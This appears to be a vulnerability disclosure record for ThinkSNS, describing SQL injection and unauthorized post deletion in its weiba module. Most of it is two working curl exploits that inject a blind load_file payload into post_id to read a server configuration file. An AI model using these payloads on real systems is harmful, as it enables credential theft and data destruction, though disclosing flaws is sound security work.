wybug_detail:
漏洞详情 披露状态：   									2014-02-11：	细节已通知厂商并且等待厂商处理中									2014-02-12：	厂商已经确认，细节仅向厂商公开									2014-02-15：	细节向第三方安全合作伙伴开放									2014-04-08：	细节向核心白帽子及相关领域专家公开									2014-04-18：	细节向普通白帽子公开									2014-04-28：	细节向实习白帽子公开									2014-05-12：	细节向公众公开  简要描述： ThinkSNS SQL注入及越权 详细说明：  微吧帖子任意删除, 存在注入\apps\weiba\Lib\Action\GroupAction.class.php

很明显有问题,利用:curl -A "Shockwave Flash" -b "CNZZDATA1702264=cnzz_eid%3D861385407-1376532587-http%253A%252F%252Fwww.th.com%26ntime%3D1379037339%26cnzz_a%3D9%26retime%3D1379037377530%26sin%3Dnone%26ltime%3D1379037377530%26rtime%3D2;PHPSESSID=3a353d4b436d1b09ee22c704da6a5b6a; T3_TSV3_ACTIVE_TIME=1379500687; T3_online_update=1379498853; T3_lang=zh-cn; T3_TSV3_LOGGED_USER=bl" -d "post_id=1 and ascii(load_file(0x433A2F77616D702F7777772F74682F636F6E6669672F636F6E6669672E696E632E706870))>60" "http://www.th.com/index.php?app=weiba&mod=group&act=postDel"删除post_id=1的帖子失败

curl -A "Shockwave Flash" -b "CNZZDATA1702264=cnzz_eid%3D861385407-1376532587-http%253A%252F%252Fwww.th.com%26ntime%3D1379037339%26cnzz_a%3D9%26retime%3D1379037377530%26sin%3Dnone%26ltime%3D1379037377530%26rtime%3D2;PHPSESSID=3a353d4b436d1b09ee22c704da6a5b6a; T3_TSV3_ACTIVE_TIME=1379500687; T3_online_update=1379498853; T3_lang=zh-cn; T3_TSV3_LOGGED_USER=bl" -d "post_id=1 and ascii(load_file(0x433A2F77616D702F7777772F74682F636F6E6669672F636F6E6669672E696E632E706870))>59" "http://www.th.com/index.php?app=weiba&mod=group&act=postDel"删除成功
